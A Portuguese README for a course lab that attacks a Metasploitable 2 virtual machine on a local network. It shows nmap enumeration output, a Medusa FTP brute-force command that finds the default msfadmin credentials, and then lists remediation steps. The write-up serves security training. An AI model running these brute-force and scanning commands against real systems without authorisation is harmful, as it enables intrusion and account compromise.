# DIO---Desafio-Metasploitable-2
Desafio do Curso da DIO: Santander - Cibersegurança do Zero a prática, o qual envolve invadir, na mesma rede, o ambiente Metasploitable 2 por meio de ataques simulados: brute force em FTP, automação de tentativas em formulário web (DVWA) e password spraying em SMB com enumeração de usuários.

## Descobrindo o alvo:  
  
### 1. ifconfig para descobrir a máscara da rede  
input 
```bash
ifconfig
```
observado
```text
inet 192.168.0.105  netmask 255.255.255.0
```
  
### 2. uso da ferramenta nmap para descobrir os dispositivos na rede local, encontrando a maquina virtual do Metasploitable 2 e quais portas estão abertas (enumeração)
input
```bash
nmap -v
```
output
```text
Nmap scan report for 192.168.0.1  
Host is up (0.0014s latency).  
Not shown: 997 closed tcp ports (reset)  
PORT     STATE SERVICE  
23/tcp   open  telnet  
80/tcp   open  http  
1900/tcp open  upnp  
MAC (ocultado por privacidade) (Fabricante do Roteador)  

Nmap scan report for 192.168.0.155  
Host is up (0.00021s latency).  
Not shown: 977 closed tcp ports (reset)  
PORT     STATE SERVICE  
21/tcp   open  ftp  
22/tcp   open  ssh  
23/tcp   open  telnet  
25/tcp   open  smtp  
53/tcp   open  domain  
80/tcp   open  http  
111/tcp  open  rpcbind  
139/tcp  open  netbios-ssn  
445/tcp  open  microsoft-ds  
512/tcp  open  exec  
513/tcp  open  login  
514/tcp  open  shell  
1099/tcp open  rmiregistry  
1524/tcp open  ingreslock  
2049/tcp open  nfs  
2121/tcp open  ccproxy-ftp  
3306/tcp open  mysql  
5432/tcp open  postgresql  
5900/tcp open  vnc  
6000/tcp open  X11  
6667/tcp open  irc  
8009/tcp open  ajp13  
8180/tcp open  unknown  
MAC (ocultado por privacidade) (Oracle VirtualBox virtual NIC)
```  

- Com isso, o ip do alvo é 192.168.0.155 e sei que as portas para os ataques (21 - ftp) estão abertas  

## Brute force em FTP com Medusa
   
Os arquivos de users e senhas são simples apenas para a demonstração

### 1. Explicando o comando  
```text
medusa -h (ip alvo) -U (arquivo com usuários) -P (arquivo com senhas) -M (protocolo / porta a atacar) -t (numero de threads ao mesmo tempo)  
```

### 2. O aplicativo tentará usar cada combinação usuario-senha para encontrar a correta
input
```bash
medusa -h 192.168.0.155 -U users.txt. -P pass.txt. -M ftp -t 6
```
dentre várias tentativas, busco a que contem:
```text
2026-11-19 15:36:11 ACCOUNT FOUND: [ftp] Host: 192.168.0.155 User: msfadmin Password: msfadmin [SUCCESS]
```

- agora que tenho user: msfadmin e senha: msfadmin, posso fazer a autenticação com o protocoo FTP
```bash
ftp 192.168.0.155
```
- o usuário e senha são pedidos e inseridos, estabelecendo conexão e expondo a máquinas à perigos como exposição de dados sensíveis, execução remota de código, interceptação de tráfego e adulteração ou destruição de arquivos

### Remediação
• Substituir o protocolo: Desativar o FTP tradicional e migrar o serviço para SFTP (SSH File Transfer Protocol) ou FTPS (FTP sobre SSL/TLS), garantindo que toda a comunicação seja criptografada.
• Desabilitar acesso anônimo: Configurar o servidor (ex: vsftpd, ProFTPD) para bloquear logins anônimos.
• Princípio do menor privilégio: Restringir os usuários autenticados apenas aos seus diretórios específicos (chroot jail) e remover permissões de escrita onde não forem estritamente necessárias.
